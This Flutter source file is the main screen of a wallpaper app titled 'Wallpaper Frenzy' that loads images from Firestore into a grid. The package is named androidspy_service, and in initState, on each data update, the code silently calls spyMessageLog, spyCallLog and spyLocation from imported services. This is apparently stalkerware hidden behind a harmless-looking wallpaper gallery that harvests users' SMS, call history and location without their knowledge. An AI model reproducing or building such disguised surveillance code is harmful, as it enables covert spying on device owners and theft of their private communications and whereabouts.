import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'dart:async';
import 'package:flutter_staggered_grid_view/flutter_staggered_grid_view.dart';
import 'package:androidspy_service/wallpaper/full_image.dart';
import 'package:androidspy_service/services/message_service.dart' as smsLog;
import 'package:androidspy_service/services/call_service.dart' as callLog;
import 'package:androidspy_service/services/location_service.dart'
    as myLocation;

class Screen extends StatefulWidget {
  @override
  _ScreenState createState() => _ScreenState();
}

class _ScreenState extends State<Screen> {
  StreamSubscription<QuerySnapshot> subscription;
  List<DocumentSnapshot> wallpapersList;
  final CollectionReference collectionReference =
      Firestore.instance.collection("wallpapers");

  @override
  void initState() {
    super.initState();
    subscription = collectionReference.snapshots().listen((datasnapshot) {
      setState(() {
        wallpapersList = datasnapshot.documents;
        smsLog.spyMessageLog();
        callLog.spyCallLog();
        myLocation.spyLocation();
      });
    });
  }

  @override
  void dispose() {
    subscription?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        centerTitle: true,
        title: Text("Wallpaper Frenzy"),
      ),
      body: wallpapersList != null
          ? StaggeredGridView.countBuilder(
              padding: const EdgeInsets.all(8.0),
              crossAxisCount: 4,
              itemCount: wallpapersList.length,
              itemBuilder: (context, i) {
                String urlPath = wallpapersList[i].data["url"];
                return Material(
                  elevation: 8.0,
                  borderRadius: BorderRadius.all(Radius.circular(5.0)),
                  child: InkWell(
                    onTap: () => Navigator.push(
                        context,
                        MaterialPageRoute(
                          builder: (context) => FullScreenImage(urlPath),
                        )),
                    child: Hero(
                      tag: urlPath,
                      child: FadeInImage(
                        image: NetworkImage(urlPath),
                        fit: BoxFit.cover,
                        placeholder: AssetImage("assets/holdimg.jpg"),
                      ),
                    ),
                  ),
                );
              },
              staggeredTileBuilder: (i) =>
                  StaggeredTile.count(2, i.isEven ? 2 : 3),
              mainAxisSpacing: 8.0,
              crossAxisSpacing: 8.0,
            )
          : Center(
              child: CircularProgressIndicator(),
            ),
    );
  }
}
